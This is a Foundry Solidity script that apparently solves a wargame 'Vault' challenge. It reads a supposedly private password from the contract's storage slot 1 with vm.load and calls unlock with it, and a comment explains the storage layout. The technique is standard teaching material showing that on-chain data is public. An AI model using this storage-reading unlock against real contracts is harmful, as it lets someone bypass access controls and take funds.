// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Vault.sol";

contract VaultScript is Script {

    Vault public vault = Vault(0xC41711FE786fd26315A923C24DEE84cE19AF5213);
    /**
     * Solution: One slot consists of 32 bytes.
     * bool locked is 1 byte, but bytes32 password is 32 bytes, that's why the password is stored on slot 1
     * p.s. cast storage contract-adress slot also can be used
     */
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        console.log("1. Locked status", vault.locked());
        bytes32 passwordBytes = vm.load(address(vault), bytes32(uint256(1))); // get's the bytes at slot 1
        vault.unlock(passwordBytes);
        console.log("2. Locked status", vault.locked());
        vm.stopBroadcast();
    }
}
